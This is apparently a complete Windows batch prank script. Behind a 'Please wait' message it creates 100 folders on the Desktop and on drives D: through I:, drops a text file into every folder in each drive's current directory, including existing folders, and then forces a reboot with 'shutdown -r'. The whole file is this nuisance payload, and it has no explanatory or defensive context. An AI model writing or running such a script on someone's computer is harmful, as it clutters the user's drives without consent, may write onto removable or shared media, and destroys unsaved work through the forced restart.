@ECHO OFF

ECHO Please wait ......
	
@echo off
C:
cd /..
cd %USERPROFILE%
cd Desktop
for /l %%x in (1, 1, 100) do (
    mkdir ahmadalfrehan%%x
)
for /D %%d in (*) do (
    cd %%d
    echo "some random text" > ahmadalfrehan.txt
    cd ..
)
D:
for /l %%x in (1, 1, 100) do (
    mkdir ahmadalfrehan%%x
)
for /D %%d in (*) do (
    cd %%d
    echo "some random text" > ahmadalfrehan.txt
    cd ..
)
E:
for /l %%x in (1, 1, 100) do (
    mkdir ahmadalfrehan%%x
)
for /D %%d in (*) do (
    cd %%d
    echo "some random text" > ahmadalfrehan.txt
    cd ..
)
F:
for /l %%x in (1, 1, 100) do (
    mkdir ahmadalfrehan%%x
)
for /D %%d in (*) do (
    cd %%d
    echo "some random text" > ahmadalfrehan.txt
    cd ..
)
G:
for /l %%x in (1, 1, 100) do (
    mkdir ahmadalfrehan%%x
)
for /D %%d in (*) do (
    cd %%d
    echo "some random text" > ahmadalfrehan.txt
    cd ..
)
H:
for /l %%x in (1, 1, 100) do (
    mkdir ahmadalfrehan%%x
)
for /D %%d in (*) do (
    cd %%d
    echo "some random text" > ahmadalfrehan.txt
    cd ..
)
I:
for /l %%x in (1, 1, 100) do (
    mkdir ahmadalfrehan%%x
)
for /D %%d in (*) do (
    cd %%d
    echo "some random text" > ahmadalfrehan.txt
    cd ..
)
shutdown -r
exit /b